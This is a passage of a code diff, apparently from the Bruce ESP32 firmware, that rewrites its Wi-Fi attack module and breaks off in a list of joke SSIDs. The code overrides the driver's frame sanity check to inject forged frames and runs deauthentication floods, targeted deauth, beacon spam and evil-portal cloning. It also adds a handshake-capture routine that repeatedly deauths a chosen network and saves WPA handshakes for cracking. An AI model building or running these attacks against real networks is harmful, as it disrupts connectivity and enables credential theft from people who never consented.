@@ -7,84 +7,179 @@
 #include "core/display.h"
 #include "core/main_menu.h"
 #include "core/mykeyboard.h"
+#include "core/sd_functions.h"
 #include "core/utils.h"
+#include "core/wifi/webInterface.h"
 #include "core/wifi/wifi_common.h"
+#include "deauther.h"
 #include "esp_system.h"
 #include "esp_wifi.h"
 #include "evil_portal.h"
+#include "karma_attack.h"
+#include "sniffer.h"
 #include "vector"
 #include <Arduino.h>
 #include <globals.h>
+#include <nvs_flash.h>
+
+#define WIFI_ATK_NAME "BruceAttack"
+extern bool showHiddenNetworks;
+
+const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 std::vector<wifi_ap_record_t> ap_records;
-/**
- * @brief Decomplied function that overrides original one at compilation time.
- *
- * @attention This function is not meant to be called!
- * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
- */
+
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337) return 1;
     else return 0;
 }
 
-uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]
+uint8_t deauth_frame[sizeof(deauth_frame_default)];
 
 wifi_ap_record_t ap_record;
+// Beacon packet template
+// clang-format off
+constexpr size_t BEACON_PKT_LEN = 109;
+const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
+    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
+    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
+    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
+    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
+    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
+    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
+    /* 36 - 37 */ 0x00, 0x20, // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
+    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
+                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
+                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
+                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
+    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
+    /* 72 */ 0x82,
+    /* 73 */ 0x84,
+    /* 74 */ 0x8b,
+    /* 75 */ 0x96,
+    /* 76 */ 0x24,
+    /* 77 */ 0x30,
+    /* 78 */ 0x48,
+    /* 79 */ 0x6c,
+    /* 80 - 81 */ 0x03, 0x01, // Current Channel tag
+    /* 82 */      0x01,       // Current channel (overwritten)
+    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
+    /* 85 - 86 */ 0x01, 0x00,
+    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
+    /* 91 - 92 */ 0x02, 0x00,
+    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
+    /*101 -102 */ 0x01, 0x00,
+    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
+    /*107 -108 */ 0x00, 0x00
+};
+// clang-format on
+constexpr size_t BEACON_TAIL_OFFSET = 70;
+constexpr size_t BEACON_TAIL_LEN = BEACON_PKT_LEN - BEACON_TAIL_OFFSET;
+constexpr size_t BEACON_TAIL_CHANNEL_OFFSET = 82 - BEACON_TAIL_OFFSET;
 
-/***************************************************************************************
-** Function: send_raw_frame
-** @brief: Broadcasts deauth frames
-***************************************************************************************/
-void send_raw_frame(const uint8_t *frame_buffer, int size) {
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_RATE_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_RATE_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_RATE_MS);
+static inline size_t prepareBeaconPacket(
+    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
+    uint8_t channel, bool setWPAflag = true
+) {
+    if (ssidLen > 32) ssidLen = 32;
+    memcpy(outPacket, beaconPacketTemplate, 38);
+    memcpy(&outPacket[10], macAddr, 6);
+    memcpy(&outPacket[16], macAddr, 6);
+    outPacket[37] = ssidLen;
+    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }
+    memcpy(&outPacket[38 + ssidLen], &beaconPacketTemplate[BEACON_TAIL_OFFSET], BEACON_TAIL_LEN);
+    outPacket[38 + ssidLen + BEACON_TAIL_CHANNEL_OFFSET] = channel;
+    return 38 + ssidLen + BEACON_TAIL_LEN;
 }
 
-/***************************************************************************************
-** function: wsl_bypasser_send_raw_frame
-** @brief: prepare the frame to deploy the attack
-***************************************************************************************/
+const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
+uint8_t channelIndex = 0;
+uint8_t wifi_channel = 1;
+
+void nextChannel() {
+    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
+    if (nChannels == 0) return;
+    channelIndex = (channelIndex + 1) % nChannels;
+    uint8_t ch = channels[channelIndex];
+    if (ch >= 1 && ch <= 14) {
+        wifi_channel = ch;
+        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+    }
+}
+
+void wifi_complete_cleanup(bool wait = true) {
+    Serial.println("[WIFI_ATK] Complete WiFi cleanup");
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    esp_wifi_stop();
+    WiFi.disconnect(true);
+#ifndef CONFIG_IDF_TARGET_ESP32P4
+    WiFi.mode(WIFI_OFF);
+#endif
+    if (wait) delay(300);
+}
+
+void checkHeap(const char *tag) {
+    uint32_t currentHeap = ESP.getFreeHeap();
+    Serial.printf("[HEAP] %s - Free: %ld\n", tag, currentHeap);
+}
+
+void resetGlobalState() {
+    options.clear();
+    options.shrink_to_fit();
+    SelPress = false;
+    EscPress = false;
+    PrevPress = false;
+    NextPress = false;
+    returnToMenu = false;
+    tft.fillScreen(bruceConfig.bgColor);
+}
+
+void send_raw_frame(const uint8_t *frame_buffer, int size) {
+    for (int i = 0; i < 3; i++) {
+        wifiRawTx(WIFI_IF_AP, frame_buffer, size);
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+}
+
 void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
-    Serial.begin(115200);
     Serial.print("\nPreparing deauth frame to AP -> ");
     for (int j = 0; j < 6; j++) {
         Serial.print(ap_record->bssid[j], HEX);
         if (j < 5) Serial.print(":");
     }
-    Serial.print(" and Tgt: ");
-    for (int j = 0; j < 6; j++) {
-        Serial.print(target[j], HEX);
-        if (j < 5) Serial.print(":");
+    if (memcmp(target, _default_target, 6) != 0) {
+        Serial.print(" and Tgt: ");
+        for (int j = 0; j < 6; j++) {
+            Serial.print(target[j], HEX);
+            if (j < 5) Serial.print(":");
+        }
     }
 
     esp_err_t err;
     err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) Serial.println("Error changing channel");
-    vTaskDelay(50 / portTICK_RATE_MS);
-    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
+    vTaskDelay(50 / portTICK_PERIOD_MS);
+    memcpy(&deauth_frame[4], target, 6);
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
 }
 
-/***************************************************************************************
-** function: wifi_atk_info
-** @brief: Open Wifi information screen
-***************************************************************************************/
-void wifi_atk_info(String tssid, String mac, uint8_t channel) {
-    // desenhar a tela
+void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel) {
     drawMainBorder();
     tft.setTextColor(bruceConfig.priColor);
-    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
-    tft.drawString("AP: " + tssid, 10, 48);
-    tft.drawString("Channel: " + String(channel), 10, 66);
-    tft.drawString(mac, 10, 84);
-    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
-    vTaskDelay(200 / portTICK_RATE_MS);
+    int rowStep = LH * FP + 10;
+    int row1Y = BORDER_PAD_Y + FM * LH + 4;
+    tft.drawCentreString("-=Information=-", tft.width() / 2, BORDER_PAD_Y, SMOOTH_FONT);
+    tft.drawString("AP: " + tssid, BORDER_PAD_X, row1Y);
+    tft.drawString("Channel: " + String(channel), BORDER_PAD_X, row1Y + rowStep);
+    tft.drawString(mac, BORDER_PAD_X, row1Y + 2 * rowStep);
+    tft.drawString(
+        "Press " + String(BTN_ALIAS) + " to act", BORDER_PAD_X, tftHeight - BORDER_PAD_X - LH * FP
+    );
+    vTaskDelay(200 / portTICK_PERIOD_MS);
     SelPress = false;
 
     while (1) {
@@ -96,34 +191,101 @@ void wifi_atk_info(String tssid, String mac, uint8_t channel) {
             returnToMenu = true;
             return;
         }
-        vTaskDelay(50 / portTICK_RATE_MS);
+        vTaskDelay(50 / portTICK_PERIOD_MS);
     }
 }
 
-/***************************************************************************************
-** function: target_atk_menu
-** @brief: Open menu to choose which AP Attack
-***************************************************************************************/
+bool wifi_atk_setWifi() {
+    checkHeap("Wifi atk start");
+
+    if (WiFi.getMode() != WIFI_MODE_NULL) { return true; }
+
+    wifi_complete_cleanup();
+
+    if (WiFi.getMode() != WIFI_MODE_APSTA) {
+        if (!WiFi.mode(WIFI_MODE_APSTA)) {
+            displayError("Failed starting WIFI", true);
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
+        uint8_t randomChannel = random(1, 12);
+
+        int attempts = 0;
+        bool apStarted = false;
+        while (attempts < 5 && !apStarted) {
+            apStarted = WiFi.softAP(WIFI_ATK_NAME, emptyString, randomChannel, 1, 4, false);
+            if (!apStarted) {
+                delay(100);
+                attempts++;
+            }
+        }
+
+        if (!apStarted) {
+            displayError("Failed starting AP Attacker", true);
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    return true;
+}
+
+bool wifi_atk_unsetWifi() {
+    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
+        if (!WiFi.softAPdisconnect()) {
+            displayError("Failed Stopping AP Attacker", true);
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    if (!WiFi.isConnected() && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();
+
+    return true;
+}
+
 void wifi_atk_menu() {
+    resetGlobalState();
+
+    if (WiFi.getMode() == WIFI_MODE_NULL) wifi_complete_cleanup(false);
+
+    checkHeap("Wifi menu start");
+
     bool scanAtks = false;
     options = {
-        {"Target Atks",  [&]() { scanAtks = true; }    },
-        {"Beacon SPAM",  [=]() { beaconAttack(); }     },
-        {"Deauth Flood", [=]() { deauthFloodAttack(); }},
+        {"Target Atks",     [&]() { scanAtks = true; }     },
+#ifndef LITE_VERSION
+        {"Karma Attack",    [=]() { karma_setup(); }       },
+#endif
+        {"Beacon SPAM",     [=]() { beaconAttack(); }      },
+        {"Deauth Flood",    [=]() { deauthFloodAttack(); } },
+        {"Enhanced Deauth", [=]() { enhancedDeauthMenu(); }},
     };
     addOptionToMainMenu();
     loopOptions(options);
+    if (!returnToMenu) {
+        if (!wifi_atk_setWifi()) return;
+    }
     if (scanAtks) {
         int nets;
-        WiFi.mode(WIFI_MODE_STA);
         displayTextLine("Scanning..");
-        nets = WiFi.scanNetworks();
+        nets = WiFi.scanNetworks(false, showHiddenNetworks);
         ap_records.clear();
         options = {};
         for (int i = 0; i < nets; i++) {
             wifi_ap_record_t record;
+            memset(&record, 0, sizeof(record));
             memcpy(record.bssid, WiFi.BSSID(i), 6);
             record.primary = static_cast<uint8_t>(WiFi.channel(i));
+            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
+            if (strlen(WiFi.SSID(i).c_str()) > 0) {
+                strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
+                record.ssid[sizeof(record.ssid) - 1] = '\0';
+            } else {
+                record.ssid[0] = '\0';
+            }
+
             ap_records.push_back(record);
 
             String ssid = WiFi.SSID(i);
@@ -139,10 +301,16 @@ void wifi_atk_menu() {
                 case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                 case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                 case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
+                case WIFI_AUTH_WPA3_PSK: encryptionTypeStr = "WPA3/PSK"; break;
+                case WIFI_AUTH_WPA2_WPA3_PSK: encryptionTypeStr = "WPA2/WPA3/PSK"; break;
                 default: encryptionTypeStr = "Unknown"; break;
             }
-            String optionText = encryptionPrefix + ssid + " (" + String(rssi) + "|" + encryptionTypeStr +
-                                "|ch." + String(ch) + ")";
+
+            String displaySSID = ssid;
+            if (displaySSID.length() == 0) { displaySSID = "<Hidden SSID> " + WiFi.BSSIDstr(i); }
+
+            String optionText = encryptionPrefix + displaySSID + " (" + String(rssi) + "|" +
+                                encryptionTypeStr + "|ch." + String(ch) + ")";
 
             options.push_back({optionText.c_str(), [=]() {
                                    ap_record = ap_records[i];
@@ -158,29 +326,36 @@ void wifi_atk_menu() {
 
         loopOptions(options);
         options.clear();
+        ap_records.clear();
+        ap_records.shrink_to_fit();
     }
+    wifi_atk_unsetWifi();
+    checkHeap("Wifi menu end");
 }
+
 void deauthFloodAttack() {
-    Serial.begin(115200);
-    WiFi.mode(WIFI_AP);
-    if (!WiFi.softAP("DeauthFlood", emptyString, 1, 1, 4, false)) {
-        displayError("Failed to start AP", true);
-        return;
-    }
-    wifiConnected = true;
+    cleanlyStopWebUiForWiFiFeature();
+    resetGlobalState();
+    if (!wifi_atk_setWifi()) return;
+
     int nets;
-    WiFi.mode(WIFI_AP);
 ScanNets:
     displayTextLine("Scanning..");
-    nets = WiFi.scanNetworks();
+    nets = WiFi.scanNetworks(false, showHiddenNetworks);
     ap_records.clear();
     for (int i = 0; i < nets; i++) {
         wifi_ap_record_t record;
+        memset(&record, 0, sizeof(record));
         memcpy(record.bssid, WiFi.BSSID(i), 6);
-        record.primary = WiFi.channel(i);
+        record.primary = static_cast<uint8_t>(WiFi.channel(i));
+        if (strlen(WiFi.SSID(i).c_str()) > 0) {
+            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
+            record.ssid[sizeof(record.ssid) - 1] = '\0';
+        } else {
+            record.ssid[0] = '\0';
+        }
         ap_records.push_back(record);
     }
-    // Prepare deauth frame for each AP record
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
     uint32_t lastTime = millis();
@@ -191,7 +366,7 @@ ScanNets:
     while (true) {
         for (const auto &record : ap_records) {
             channel = record.primary;
-            wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
+            wsl_bypasser_send_raw_frame(&record, record.primary, _default_target);
             tft.setCursor(10, tftHeight - 45);
             tft.println("Channel " + String(record.primary) + "    ");
             for (int i = 0; i < 100; i++) {
@@ -201,7 +376,6 @@ ScanNets:
             }
             if (EscPress) break;
         }
-        // Update counter every 2 seconds
         if (millis() - lastTime > 2000) {
             drawMainBorderWithTitle("Deauth Flood");
             tft.setCursor(10, tftHeight - 25);
@@ -213,111 +387,314 @@ ScanNets:
             count = 0;
             lastTime = millis();
         }
-        if (millis() - rescan_counter > 60000) goto ScanNets; // re-scan networks for more relability
+        if (millis() - rescan_counter > 60000) goto ScanNets;
 
         if (check(EscPress)) break;
     }
-
-    wifiDisconnect();
+    wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
-/***************************************************************************************
-** function: target_atk_menu
-** @brief: Open menu to choose which AP Attack
-***************************************************************************************/
-void target_atk_menu(String tssid, String mac, uint8_t channel) {
+uint8_t targetBssid[6];
+#if !defined(LITE_VERSION)
+void capture_handshake(const String &tssid, const String &mac, uint8_t channel) {
+    cleanlyStopWebUiForWiFiFeature();
+
+    hsTracker = HandshakeTracker();
+
+    uint8_t bssid_array[6];
+    sscanf(
+        mac.c_str(),
+        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        &bssid_array[0],
+        &bssid_array[1],
+        &bssid_array[2],
+        &bssid_array[3],
+        &bssid_array[4],
+        &bssid_array[5]
+    );
+
+    memcpy(ap_record.bssid, bssid_array, 6);
+    memcpy(targetBssid, bssid_array, 6);
+    ap_record.primary = channel;
+
+    String encryptionTypeStr = "Unknown";
+    for (int i = 0; i < ap_records.size(); i++) {
+        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
+            switch (ap_records[i].authmode) {
+                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
+                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
+                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
+                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
+                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
+                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
+                case WIFI_AUTH_WPA3_PSK: encryptionTypeStr = "WPA3/PSK"; break;
+                case WIFI_AUTH_WPA2_WPA3_PSK: encryptionTypeStr = "WPA2/WPA3/PSK"; break;
+                default: encryptionTypeStr = "Unknown"; break;
+            }
+            break;
+        }
+    }
+
+    String sanitizedSsid = "";
+    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
+        char c = tssid[i];
+        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
+            c == '_' || c == '.') {
+            sanitizedSsid += c;
+        } else {
+            sanitizedSsid += '_';
+        }
+    }
+    if (sanitizedSsid.length() == 0) {
+        char bssidHex[32];
+        sprintf(
+            bssidHex,
+            "%02X%02X%02X%02X%02X%02X",
+            bssid_array[0],
+            bssid_array[1],
+            bssid_array[2],
+            bssid_array[3],
+            bssid_array[4],
+            bssid_array[5]
+        );
+        sanitizedSsid = String("HIDDEN_") + String(bssidHex);
+    }
+
+    FS *fs;
+    if (setupSdCard()) {
+        fs = &SD;
+        isLittleFS = false;
+        if (!SD.exists("/BrucePCAP/handshakes")) {
+            SD.mkdir("/BrucePCAP");
+            SD.mkdir("/BrucePCAP/handshakes");
+        }
+    } else {
+        fs = &LittleFS;
+        isLittleFS = true;
+        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
+            LittleFS.mkdir("/BrucePCAP");
+            LittleFS.mkdir("/BrucePCAP/handshakes");
+        }
+    }
+
+    Serial.print("Target BSSID: ");
+    for (int i = 0; i < 6; i++) {
+        Serial.printf("%02X", bssid_array[i]);
+        if (i < 5) Serial.print(":");
+    }
+    Serial.println();
+
+    checkHeap("Handshake start");
+
+    wifi_complete_cleanup();
+
+    if (!WiFi.mode(WIFI_MODE_APSTA)) {
+        displayError("Failed starting WIFI", true);
+        return;
+    }
+    vTaskDelay(pdMS_TO_TICKS(100));
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+
+    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
+        displayError("Sniffer queue error", true);
+        return;
+    }
+
+    ch = channel;
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(sniffer);
+    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
+    esp_wifi_set_channel(channel, secondCh);
+
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+    int deauthCount = 0;
+    int initialNumEAPOL = num_EAPOL;
+    int prevNumEAPOL = initialNumEAPOL;
+    bool hasBeacons = false;
+    unsigned long autoDeauthTimer = millis();
+    unsigned long countdownTick = 0;
+
+    enum { SCANNING, MONITORING, CAPTURED } phase = SCANNING;
+
+    bool needRedraw = true;
+
+    auto sendDeauthBurst = [&]() {
+        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+        for (int i = 0; i < 5; i++) {
+            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        deauthCount += 5;
+        needRedraw = true;
+        autoDeauthTimer = millis();
+    };
+
+    auto deauthInterval = [&]() -> unsigned long { return (phase == SCANNING) ? 10000UL : 15000UL; };
+
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FM);
+
+    sendDeauthBurst();
+
+    while (true) {
+        BeaconList targetBeacon;
+        memcpy(targetBeacon.MAC, bssid_array, 6);
+        targetBeacon.channel = channel;
+        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }
+
+        if (num_EAPOL > prevNumEAPOL) {
+            prevNumEAPOL = num_EAPOL;
+            needRedraw = true;
+        }
+
+        if (handshakeUsable(hsTracker)) {
+            phase = CAPTURED;
+        } else if (hsTracker.msg1 && phase == SCANNING) {
+            phase = MONITORING;
+        }
+
+        if (phase != CAPTURED && millis() - countdownTick >= 3000) {
+            needRedraw = true;
+            countdownTick = millis();
+        }
+
+        if (needRedraw) {
+            drawMainBorderWithTitle("Handshake Capture");
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            padprintln("");
+            padprintln("SSID: " + tssid);
+            padprintln("BSSID: " + mac);
+            padprintln("Security: " + encryptionTypeStr);
+
+            if (phase == CAPTURED) {
+                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                padprintln("Status: CAPTURED!");
+            } else if (hasBeacons) {
+                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+                padprintln("Status: " + String(phase == MONITORING ? "Monitoring..." : "Scanning..."));
+            } else {
+                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+                padprintln("Status: Waiting...");
+            }
+
+            if (tftHeight > 135) {
+                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
+                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
+                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
+                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            } else {
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                padprint("EAPOL MSG:");
+                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                tft.print(" 1");
+                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                tft.print(" 2");
+                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                tft.print(" 3");
+                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
+                tft.print(" 4");
+                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3 && hsTracker.msg4) {
+                    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                    tft.println(" > All Captured");
+                } else tft.println("");
+            }
+
+            padprint("Deauth sent: " + String(deauthCount));
+            if (phase != CAPTURED) {
+                unsigned long remaining = deauthInterval() - (millis() - autoDeauthTimer);
+                if (remaining > deauthInterval()) remaining = 0;
+                tft.println(", more in " + String(remaining / 1000) + "s  [OK]");
+            } else tft.println();
+
+            if (phase != CAPTURED) {
+                padprintln("Press " + String(BTN_ALIAS) + " to deauth");
+            } else {
+                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                padprintln("Handshake saved!        ");
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            }
+            tft.drawString("Press Esc to exit", 10, tftHeight - 20);
+
+            needRedraw = false;
+        }
+
+        if (check(SelPress) && phase != CAPTURED) { sendDeauthBurst(); }
+
+        if (phase != CAPTURED) {
+            if (millis() - autoDeauthTimer >= deauthInterval()) { sendDeauthBurst(); }
+        }
+
+        if (check(EscPress)) { break; }
+
+        vTaskDelay(50 / portTICK_PERIOD_MS);
+    }
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    esp_wifi_stop();
+    delay(100);
+    returnToMenu = true;
+}
+#endif
+
+void target_atk_menu(const String &tssid, const String &mac, uint8_t channel) {
 AGAIN:
     options = {
         {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
         {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
+#ifndef LITE_VERSION
+        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
+#endif
         {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
         {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
-        {"Deauth+Clone+Verify",
-         [=]() // New WiFi Attack
-         { EvilPortal(tssid, channel, true, true); }                               },
+        {"Deauth+Clone+Verify", [=]() { EvilPortal(tssid, channel, true, true); }  },
     };
     addOptionToMainMenu();
 
     loopOptions(options);
-    if (!returnToMenu) goto AGAIN; // get back from Information without overflow the stack
+    if (!returnToMenu) goto AGAIN;
 }
 
-/***************************************************************************************
-** function: target_atk
-** @brief: Deploy Target deauth
-***************************************************************************************/
-void target_atk(String tssid, String mac, uint8_t channel) {
-    Serial.begin(115200);
+void target_atk(const String &tssid, const String &mac, uint8_t channel) {
+    uint8_t mac_array[6];
+    sscanf(
+        mac.c_str(),
+        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        &mac_array[0],
+        &mac_array[1],
+        &mac_array[2],
+        &mac_array[3],
+        &mac_array[4],
+        &mac_array[5]
+    );
 
-    WiFi.mode(WIFI_AP);
-    if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
-        while (!check(SelPress)) { yield(); }
-    }
-    wifiConnected = true;
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, channel);
+    eth_addr eth;
+    memcpy(eth.addr, mac_array, 6);
+    ip4_addr_t ip;
+    ip.addr = 0;
+    Host target(&ip, &eth);
 
-    // loop com o ataque mostrando o numero de frames por segundo
-    uint32_t tmp = 0;
-    uint16_t count = 0;
-    tmp = millis();
-    bool redraw = true;
-    check(SelPress);
-
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    setCpuFrequencyMhz(240);
-    while (1) {
-        if (redraw) {
-            // desenhar a tela
-            drawMainBorderWithTitle("Target Deauth");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            padprintln("");
-            padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(channel));
-            padprintln(mac);
-            vTaskDelay(50 / portTICK_RATE_MS);
-            redraw = false;
-        }
-        // Send frame
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        count += 3; // the function above sends 3 frames each time
-        // atualize counter
-        if (millis() - tmp > 2000) {
-            tft.setCursor(15, tftHeight - 23);
-            tft.print("Frames: " + String(count / 2) + "/s");
-            count = 0;
-            tmp = millis();
-        }
-        // Pause attack
-        if (check(SelPress)) {
-            displayTextLine("Deauth Paused");
-            // wait to restart or kick out of the function
-            while (!check(SelPress)) {
-                if (check(EscPress)) break;
-            }
-            redraw = true;
-        }
-        // Checks para sair do while
-        if (check(EscPress)) break;
-    }
-    wifiDisconnect();
-    returnToMenu = true;
+    stationDeauth(target);
 }
 
 void generateRandomWiFiMac(uint8_t *mac) {
+    mac[0] = (random(0, 255) & 0xFC) | 0x02;
     for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
 }
 
 char randomName[32];
 char *randomSSID() {
     const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    int len = rand() % 22 + 7; // Generate a random length between 1 and 10
-    for (int i = 0; i < len; ++i) {
-        randomName[i] = charset[rand() % strlen(charset)]; // S elect random characters from the charset
-    }
-    randomName[len] = '\0'; // Null-terminate the string
+    int len = rand() % 22 + 7;
+    for (int i = 0; i < len; ++i) { randomName[i] = charset[rand() % strlen(charset)]; }
+    randomName[len] = '\0';
     return randomName;
 }
 
@@ -328,6 +705,7 @@ const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                 "Martin Router King\n"
                                 "John Wilkes Bluetooth\n"
                                 "Pretty Fly for a Wi-Fi\n"
+#ifndef LITE_VERSION
                                 "Bill Wi the Science Fi\n"
